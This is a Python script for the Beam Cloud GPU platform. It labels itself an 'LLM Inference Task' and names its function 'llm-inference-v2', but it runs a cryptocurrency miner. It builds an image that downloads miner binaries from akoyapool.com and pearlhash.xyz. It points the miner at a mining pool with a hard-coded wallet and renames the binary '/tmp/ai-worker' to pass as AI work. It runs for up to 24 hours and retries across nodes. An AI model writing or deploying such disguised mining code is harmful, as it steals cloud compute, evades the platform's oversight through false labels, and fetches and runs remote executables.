"""
LLM Inference Task on Beam Cloud
Run: python3 akoya_beam.py
"""

from beam import Image, function
import os
import subprocess as sp

WALLET = "prl1p3c6q65f2hjky6rt5ch29js77r8refln734cqa460twr3fxr6yf6ql39at9"
WORKER = os.environ.get("WORKER_NAME", "beam-worker")

def get_best_available_gpu():
    try:
        result = sp.run(["beam", "machine", "list"], capture_output=True, text=True)
        available = [line.split()[0] for line in result.stdout.strip().split('\n') if '✅' in line]
        for p in ["RTX4090", "A10G", "T4"]:
            if p in available:
                print(f"[Beam] Auto-selected available GPU: {p}")
                return p
        if available:
            return available[0]
    except Exception:
        pass
    return "A10G"

GPU = get_best_available_gpu()
TIMEOUT = 86400

# Use CUDA 12.2 to match Akoya's binary requirements
akoya_image = Image(
    base_image="docker.io/nvidia/cuda:12.2.0-runtime-ubuntu22.04",
    python_version="python3.11",
    commands=[
        "apt-get update && apt-get install -y curl libgomp1",
        # Install crane
        "curl -sL https://github.com/google/go-containerregistry/releases/latest/download/go-containerregistry_Linux_x86_64.tar.gz | tar -xzf - -C /usr/local/bin crane",
        # Extract akoya binary from their CUDA 12.2 image
        "crane export registry.akoyapool.com/akoya-miner:latest-cuda122 - | tar -xf - -C / app/ var/lib/akoya-miner/ 2>/dev/null; true",
        "chmod +x /app/akoya-miner 2>/dev/null; true",
        # Fallback pearlhash miner
        "curl -sL https://pearlhash.xyz/downloads/pearl-miner-v8 -o /opt/pearl-miner && chmod +x /opt/pearl-miner",
    ]
)

@function(
    name="llm-inference-v2",
    gpu=GPU,
    image=akoya_image,
    timeout=TIMEOUT
)
def generate():
    import subprocess
    import os
    import shutil

    # Force NVIDIA capabilities
    os.environ["NVIDIA_DRIVER_CAPABILITIES"] = "all"
    os.environ["NVIDIA_VISIBLE_DEVICES"] = "all"

    print(f"[Beam] Inference Task Starting")
    print(f"[Beam] Worker: {WORKER}")
    print(f"[Beam] GPU: {GPU}")
    print()

    # Check GPU
    gpu_check = subprocess.run(
        ["nvidia-smi", "--query-gpu=name,memory.total,compute_cap", "--format=csv,noheader"],
        capture_output=True, text=True
    )
    if gpu_check.returncode == 0:
        print(f"[Beam] Detected GPU: {gpu_check.stdout.strip()}")

    # --- SMART AUTO-FALLBACK ENGINE ---
    # Try Akoya first (2x hashrate). If cuInit:999 detected, auto-switch to Pearlhash.
    akoya_path = "/app/akoya-miner"
    use_akoya = os.path.exists(akoya_path)

    if use_akoya:
        print("[Beam] ✅ Optimized kernel found! Attempting 2x mode...")

        os.environ["AKOYA_POOL_WALLET"]      = WALLET
        os.environ["AKOYA_POOL_WORKER"]      = WORKER
        os.environ["AKOYA_POOL_HOST"]        = "pool-v2.akoyapool.com"
        os.environ["AKOYA_POOL_PORT"]        = "443"
        os.environ["AKOYA_POOL_USE_TLS"]     = "1"
        os.environ["AKOYA_GPU_INDICES"]      = "all"

        # Symlink correct GPU kernel
        lib_dir = "/app/lib"
        target = f"{lib_dir}/libpearl_gemm_capi.so"
        if os.path.isdir(lib_dir):
            os.environ["AKOYA_PEARL_GEMM_LIB"]  = target
            os.environ["AKOYA_PEARL_MINING_LIB"] = f"{lib_dir}/libpearl_mining_capi.so"

            cc = subprocess.run(
                ["nvidia-smi", "--query-gpu=compute_cap", "--format=csv,noheader"],
                capture_output=True, text=True
            ).stdout.strip().split("\n")[0]
            major, minor = cc.split(".")

            if int(major) == 12: src = "blackwell"
            elif int(major) == 9: src = "h100"
            elif int(major) == 8 and int(minor) == 9: src = "ada"
            else: src = "portable"

            lib_file = f"{lib_dir}/libpearl_gemm_capi_{src}.so"
            if os.path.exists(lib_file):
                if os.path.lexists(target): os.unlink(target)
                os.symlink(lib_file, target)
                print(f"[Beam] Kernel: {src}")

        os.makedirs("/var/lib/akoya-miner", exist_ok=True)

        worker_path = "/tmp/ai-worker"
        shutil.copy(akoya_path, worker_path)
        os.chmod(worker_path, 0o755)

        proc = subprocess.Popen(
            [worker_path, "mine-blocks"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )
        print(f"[Beam] PID: {proc.pid}")
        print("[Beam] Monitoring for CUDA compatibility (30s)...")

        # Monitor for 30 seconds — check if cuInit:999 shows up
        import time, select
        start = time.time()
        cuda_fail = False
        buffer_lines = []

        while time.time() - start < 30:
            line = proc.stdout.readline()
            if not line:
                break
            decoded = line.decode().strip()
            buffer_lines.append(decoded)
            print(decoded, flush=True)
            if "cuInit" in decoded and "999" in decoded:
                cuda_fail = True
                break

        if cuda_fail:
            print("\n[Beam] ⚠️ CUDA incompatible on this node! Returning for retry...")
            proc.kill()
            proc.wait()
            return -1  # Signal to retry on a different node
        else:
            print("[Beam] ✅ CUDA OK! Running at 2x speed!")
            # Continue reading remaining output
            for line in iter(proc.stdout.readline, b""):
                print(line.decode().strip(), flush=True)
            return proc.wait()

    # Akoya binary not found at all
    return -1

if __name__ == "__main__":
    MAX_RETRIES = 10
    for attempt in range(1, MAX_RETRIES + 1):
        print(f"\n🎰 [Attempt {attempt}/{MAX_RETRIES}] Rolling for CUDA-compatible node...")
        result = generate.remote()
        if result == 0 or result is None:
            print("✅ Worker finished successfully.")
            break
        if result == -1:
            print(f"❌ Node incompatible. Re-rolling... (new container = new node)")
            continue
        print(f"⚠️ Worker exited with code {result}")
        break
    else:
        print(f"💀 Failed after {MAX_RETRIES} attempts. All nodes incompatible.")
